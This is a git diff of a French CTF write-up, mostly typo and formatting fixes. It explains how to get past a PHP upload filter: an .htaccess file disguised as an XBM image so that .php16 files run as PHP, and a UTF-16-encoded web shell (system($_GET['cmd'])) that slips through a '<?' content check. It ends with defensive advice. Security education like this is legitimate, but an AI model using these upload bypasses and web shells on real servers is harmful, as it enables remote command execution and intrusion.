@@ -19,7 +19,7 @@ Alors suivez le guide !
 
 ## Exemple de code vulnérable
 
-L'objectif du challenge était de pouvoir exécuter des commandes sur le serveur distant à l'aide de la fonctionnalité de dépôt de fichier. Or, celle ci semble bien protégée.
+L'objectif du challenge était de pouvoir exécuter des commandes sur le serveur distant à l'aide de la fonctionnalité de dépôt de fichier. Or, celle-ci semble bien protégée.
 
 Le code source de la page est donnée ci-dessous.
 
@@ -106,25 +106,25 @@ echo "</ul>";
 </form>
 ```
 
-Le rendu de la page est relativement simple
+Le rendu de la page est relativement simple :
 
-![](/images/bypass-file-upload/2023-10-05-16-29-21.png)
+![Rendu site web](/images/bypass-file-upload/2023-10-05-16-29-21.png)
 
-Pour résumer l'analyse des sécurité :
+Pour résumer l'analyse des filtres de sécurité :
 
-- L'application vérifie l'extension du fichier. Si le fichier se termine par .php ou quelque chose de similaire, il est refusé.
-- L'application vérifie le nom du fichier. Si le nom du fichier ne peut pas être divisé en deux fois avec le séparateur .php, il est refusé.
-- L'application vérifie le contenu. Si la chaîne `<?` est présente dans le contenu, le fichier est refusé.
-- L'application vérifie l'en-tête. Si le fichier n'est pas une image, il est refusé.
-- L'application vérifie la taille. Si la hauteur et la largeur du fichier ne sont pas égales à 1337, le fichier est refusé.
+- L'application vérifie **l'extension du fichier**. Si le fichier se termine par .php ou quelque chose de similaire, il est refusé.
+- L'application vérifie **le nom du fichier**. Si le nom du fichier ne peut pas être divisé en deux fois avec le séparateur .php, il est refusé.
+- L'application vérifie **le contenu**. Si la chaîne `<?` est présente dans le contenu, le fichier est refusé.
+- L'application vérifie **l'en-tête**. Si le fichier n'est pas une image, il est refusé.
+- L'application vérifie **la taille**. Si la hauteur et la largeur du fichier ne sont pas égales à 1337, le fichier est refusé.
 
 Comment faire ?
 
 ## Choisir le bon fichier
 
-Pour résumer, il n'est pas possible de télécharger de fichier avec l'extension `php`. L'objectif est donc d'obtenir la possibilité d'exécuter le code php dans un autre fichier que `.php`. Pour cela, il est possible d'utiliser un fichier `.htaccess`.
+Pour résumer, il n'est pas possible de télécharger de fichiers avec l'extension `php`. L'objectif est donc d'obtenir la possibilité d'exécuter du code php dans un autre fichier que `.php`. Pour cela, il est possible d'utiliser un fichier `.htaccess`.
 
-Mais qu'est-ce qu'un fichier .htaccess ?
+Mais qu'est-ce qu'un fichier `.htaccess` ?
 
 > Un fichier .htaccess est un fichier de configuration qui permet de modifier le comportement d'un serveur web Apache. Il est généralement situé dans le répertoire racine d'un site web, mais il peut également être placé dans des sous-répertoires.
 
@@ -142,9 +142,9 @@ php_value display_errors 1                  # Display php errors
 1. La première ligne indique que l'on veut faire exécuter du PHP à l'aide de l'extension `.php16`.
 2. La deuxième ligne indique un encodage particulier.
 3. La troisième ligne indique si le fichier à un encodage particulier.
-4. La quatrième ligne indique d'affichier les erreurs PHP (utile dans notre cas).
+4. La quatrième ligne indique d'afficher les erreurs PHP (utile dans notre cas).
 
-Ce fichier de configuration pourrait permettre d'obtenir une exécution de commande. Or, lors du dépôt l'application donne l'erreur suivante :
+Ce fichier de configuration pourrait permettre d'obtenir une exécution de commande. Or, lors du dépôt, l'application donne l'erreur suivante :
 
 `lol filename is empty`
 
@@ -174,7 +174,7 @@ En bas de la page un format semble intéressant :
 
 ![](/images/bypass-file-upload/2023-10-05-16-42-43.png)
 
-Ok mais qu'est-ce qu'un fichier xbm ?
+Ok mais qu'est-ce qu'un fichier XBM ?
 
 > X BitMap, abrégé XBM, est un format d'image numérique monochrome originellement conçu pour le système X Window, notamment pour les images de pointeur et d'icône.
 
@@ -190,7 +190,7 @@ static char test_bits[] = {
 
 Le format de `xbitmap` est assez clair. La taille de l'image est noté sur les premières lignes du fichier à l'aide d'un `#`. Ce format très proche du format `.htaccess` permet de contourner la fonction `exif_imagetype($tmp_name)` du programme.
 
-Nouveau fichier `..htaccess` :
+Voici le contenu du nouveau fichier `..htaccess` :
 
 ```bash
 #define width 1337                          # Define the width wanted by the code
@@ -209,13 +209,13 @@ Le fichier est correctement traité et déposé sur le serveur !
 
 ## Contourner la protection anti-php
 
-Un autre filtre empêche le dépôt de contenu PHP avec le filtre sur `<?`. Or, il est possible de le contourner en encodant le payload. 
+Un autre filtre empêche le dépôt de contenu PHP avec la vérification de la chaine de caractères `<?`. Or, il est possible de contourner cette protection en encodant le payload. 
 
 En effet, PHP supporte plusieurs format d'encodage. Actuellement, l'écriture de base est en utf-8, mais PHP supporte également l'encodage utf-16. 
 
 En utf-8, un caractère est encodé sur 1 octet.
 
-```bash
+```php
 00000000: 3c3f 7068 7020 7379 7374 656d 2824 5f47  <?php system($_G
 00000010: 4554 5b27 636d 6427 5d29 3b20 6469 6528  ET['cmd']); die(
 00000020: 293b 203f 3e0a                           ); ?>.
@@ -223,7 +223,7 @@ En utf-8, un caractère est encodé sur 1 octet.
 
 Or, en utf-16 l'encodage est effectué sur **2 octets**.
 
-```bash
+```php
 00000000: 003c 003f 0070 0068 0070 0020 0073 0079  .<.?.p.h.p. .s.y
 00000010: 0073 0074 0065 006d 0028 0024 005f 0047  .s.t.e.m.(.$._.G
 00000020: 0045 0054 005b 0027 0063 006d 0064 0027  .E.T.[.'.c.m.d.'
@@ -231,7 +231,7 @@ Or, en utf-16 l'encodage est effectué sur **2 octets**.
 00000040: 0029 003b 0020 003f 003e 0a              .).;. .?.>.
 ```
 
-Il a été choisi ici un encodage utf-16 Big Endian. Le premier caractère `<` s'écrira donc `003c` en utf-16 au lieu de `3c` en utf-8. Avec cette astuce, le filtre est contourné.
+Il a été choisi ici un encodage **utf-16 Big Endian**. Le premier caractère `<` s'écrira donc `003c` en utf-16 au lieu de `3c` en utf-8. Avec cette astuce, le filtre est contourné.
 
 Voici un petit script python pour automatiser la création de payload.
 
@@ -266,7 +266,7 @@ generate_php_file("getfile.php16", "<?php echo file_get_contents($_GET['file']);
 generate_php_file("info.php16", "<?php phpinfo(); die(); ?>")
 ```
 
-Plus qu'à déposer et apprécier sa webshell bien mérité. Ouf ! 😂
+Il n'y a plus qu'à déposer et apprécier sa webshell bien méritée. Ouf ! 😂
 
 ![](/images/bypass-file-upload/2023-10-05-16-56-26.png)
 
@@ -282,4 +282,4 @@ Pour se protéger contre les contournements utilisés dans ce challenge, le dév
 3. Empêcher l'interprétation des fichiers `.htaccess` dans le répertoire.
 4. Installer un WAF (Web Application Firewall) comme ModSecurity de Apache.
 
-A retenir ! Ne jamais faire confiance aux entrées utilisateurs !
+A retenir ! Ne faites jamais confiance aux entrées utilisateurs !
